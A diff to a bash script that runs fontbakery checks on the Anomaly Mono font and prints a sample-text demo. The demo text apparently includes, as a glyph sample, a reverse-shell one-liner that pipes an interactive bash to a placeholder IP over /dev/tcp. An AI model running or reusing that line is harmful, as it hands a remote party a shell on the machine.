@@ -1,5 +1,7 @@
 #!/bin/bash
 
+SCRIPT_DIR="$(builtin cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)"
+
 bold=$(tput bold)
 red='\033[0;31m'
 green='\033[0;32m'
@@ -26,6 +28,7 @@ abcdefghijklmnopqrstuvwxyz
 
 public static void main(String[] args) { }
 function square(n) { return n * n; }
+valid = resultA && resultB
 sum = lambda x, y : x + y
 (x ^= y), (y ^= x), (x ^= y);
 bash -i >& /dev/tcp/192.168.0.XX 0>&1
@@ -41,15 +44,15 @@ EOM
 }
 
 function runFontBakery () {
-    echo -e "${ltcyan}Running $1...${nc}"
-    sleep 1
-    fontbakery $1 *.otf
+    echo -e "${ltcyan}Running $1${nc}"
+    read -p "Press enter to continue"
+    fontbakery $1 "$SCRIPT_DIR/../AnomalyMono-Regular.otf"
     case "$?" in
         0)
-            SUMMARY+="$1: ${green}${bold}PASSED${normal}${nc}\n"
+            SUMMARY+="$1  ${green}${bold}PASSED${normal}${nc}\n"
             ;;
         1)
-            SUMMARY+="$1: ${red}${bold}FAILED${normal}${nc}\n"
+            SUMMARY+="$1  ${red}${bold}FAILED${normal}${nc}\n"
             RESULT=1
             ;;
     esac
@@ -61,9 +64,9 @@ if ! [[ -x "$(command -v fontbakery)" ]]; then
 fi
 
 runDemo
+runFontBakery "check-universal  "
 runFontBakery "check-googlefonts"
-runFontBakery "check-adobefonts"
-runFontBakery "check-fontval"
+runFontBakery "check-adobefonts "
 
 echo -e "$BREAK\n"
 echo -e "Summary:\n$SUMMARY"
